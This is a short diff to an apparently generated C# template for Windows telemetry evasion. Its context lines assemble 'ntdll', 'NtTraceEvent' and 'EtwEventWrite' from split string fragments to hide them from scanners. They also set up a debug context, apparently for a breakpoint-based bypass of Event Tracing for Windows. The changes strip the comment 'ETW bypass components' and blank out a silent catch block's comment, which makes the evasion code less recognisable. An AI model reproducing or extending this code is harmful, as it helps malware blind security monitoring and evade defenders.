@@ -24,7 +24,6 @@ namespace $namespace
         static IntPtr pTargetFunc = RuntimeAPI.GetProcAddress(BaseAddress, string.Join("", procParts));
         static IntPtr pContextPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(RuntimeAPI.DEBUG_CONTEXT64)));
         
-        // ETW bypass components
         static string[] etwLib = {"nt", "dll"};
         static string[] etwFunc1 = {"Nt", "Trace", "Event"};
         static string[] etwFunc2 = {"Etw", "Event", "Write"};
@@ -64,7 +63,7 @@ namespace $namespace
             }
             catch
             {
-                // Silent error handling
+
             }
         }
         
